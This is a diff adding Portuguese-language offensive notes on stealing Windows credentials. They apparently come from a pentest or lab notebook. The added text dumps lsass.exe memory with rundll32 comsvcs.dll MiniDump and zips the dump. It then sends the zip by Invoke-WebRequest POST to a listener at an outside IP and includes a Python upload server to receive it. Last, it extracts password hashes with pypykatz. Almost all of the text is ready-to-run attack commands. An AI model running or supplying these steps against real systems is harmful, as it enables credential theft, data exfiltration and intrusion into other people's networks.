@@ -70,9 +70,66 @@ Image Name                     PID Session Name        Session#    Mem Usage
 lsass.exe                      688 Services                   0     19,788 K
 #+end_src
 
+* data exfiltration
+
 function MiniDump do comsvcs.dll, para realizar uma cópia do lsass.exe -->
 #+begin_src powershell
 rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 688 C:\Users\Public\lsass.dmp full
 #+end_src
 
+comprimindo o arquivo -->
+#+begin_src powershell
+Compress-Archive -Path lsass.dmp -DestinationPath lsass.zip
+#+end_src
+
+
+python server para receber estes dados -->
+#+begin_src python
+#!/usr/bin/env python3
+
+import http.server
+import socketserver
+import os
+
+class MyhttpHandler(http.server.SimpleHTTPRequestHandler):
+    def do_POST(self):
+        content_length = int(self.headers['Content-Length'])
+        post_data = self.rfile.read(content_length)
+
+        filename = os.path.basename(self.path) or 'uploaded_file.zip'
+
+        with open(filename, 'wb') as f:
+            f.write(post_data)
+
+        self.send_response(200)
+        self.end_headers()
+        self.wfile.write(b'file uploaded')
+
+        print(f"\n[+] foçe received: {filename}")
+
+PORT = 8001
+
+Handler = MyhttpHandler
+with socketserver.TCPServer(("", PORT), Handler) as httpd:
+    print(f"started on {PORT}")
+    httpd.serve_forever()
+#+end_src
+
+enviando os dados para o python server -->
+#+begin_src powershell
+Invoke-WebRequest -Uri "http://10.10.40.118:8001/lsass.zip" -Method Post -InFile "C:\Users\Public\lsass.zip" -Verbose"
+#+end_src
+
+* data unzip
+ao receber o arquivo comprimido, descomprimir e utilizar o ~pypykatz~ para verificar o mais importante, os hashs -->
+
+#+begin_src sh
+pypykatz lsa minidump lsass.dmp
+#+end_src
+
+** pypykatz setup
+instalação simples com o pipx -->
+#+begin_src sh
+pipx install pypykatz
+#+end_src
 
